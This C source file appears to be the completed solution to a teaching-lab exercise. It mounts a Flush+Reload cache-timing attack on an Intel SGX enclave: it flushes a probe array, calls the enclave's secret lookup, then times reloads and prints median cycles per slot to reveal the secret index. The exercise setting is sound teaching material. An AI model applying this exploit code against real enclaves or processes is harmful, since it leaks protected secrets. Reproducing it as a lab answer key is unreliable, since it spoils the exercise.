/* utility headers */
#include "debug.h"
#include "cacheutils.h"

/* SGX untrusted runtime */
#include <sgx_urts.h>
#include "Enclave/encl_u.h"

#define NUM_SAMPLES         100
#define NUM_SLOTS           10
#define SLOT_SIZE           0x1000
#define ARRAY_LEN           (NUM_SLOTS*SLOT_SIZE)
#define GET_SLOT(k)         (array[k*SLOT_SIZE])
char __attribute__((aligned(0x1000))) array[ARRAY_LEN];

sgx_enclave_id_t create_enclave(void)
{
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_enclave_id_t eid = -1;

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );

    return eid;
}

int compare(const void * a, const void * b) {
   return ( *(uint64_t*)a - *(uint64_t*)b );
}
int tsc[NUM_SLOTS][NUM_SAMPLES];

int main( int argc, char **argv )
{
    sgx_enclave_id_t eid = create_enclave();
    int rv = 1, secret = 0;
    int i, j, med;

    /* Ensure array pages are mapped in */
    for (i=0; i < ARRAY_LEN; i++)
        array[i] = 0x00;

    for (j=0; j < NUM_SLOTS; j++)
        for (i=0; i < NUM_SAMPLES; i++)
            tsc[j][i] = 0;
    
    /* ---------------------------------------------------------------------- */
    // info_event("calling enclave...");

    // /* Example victim invocation */
    // SGX_ASSERT( ecall_secret_lookup(eid, array, ARRAY_LEN) );

    /* =========================== START SOLUTION =========================== */
    // repeat it NUM_SAMPLES times and take the median
    for(int i=0;i<NUM_SAMPLES;i++){
        uint64_t tsc1, tsc2;

        // flush the array -- Step 1
        for(int j=0;j<NUM_SLOTS;j++){
            flush(&array[SLOT_SIZE*j]);
        }

        // lookup the secret(victim) -- Step 2
        ecall_secret_lookup(eid, array, ARRAY_LEN);

        // reload the array and note down time taken -- Step 3
        for(int j=0;j<NUM_SLOTS;j++){
            tsc[j][i] = reload(&array[SLOT_SIZE*j]);
        }

    }
    /* =========================== END SOLUTION =========================== */

    for (j=0; j < NUM_SLOTS; j++)
    {
        /* compute median over all samples (avg may be affected by outliers) */
        qsort(tsc[j], NUM_SAMPLES, sizeof(int), compare);
        med = tsc[j][NUM_SAMPLES/2];
        printf("Time slot %3d (CPU cycles): %d\n", j, med);
    }

    /* ---------------------------------------------------------------------- */
    info_event("destroying SGX enclave");
    SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info("all is well; exiting..");
	return 0;
}
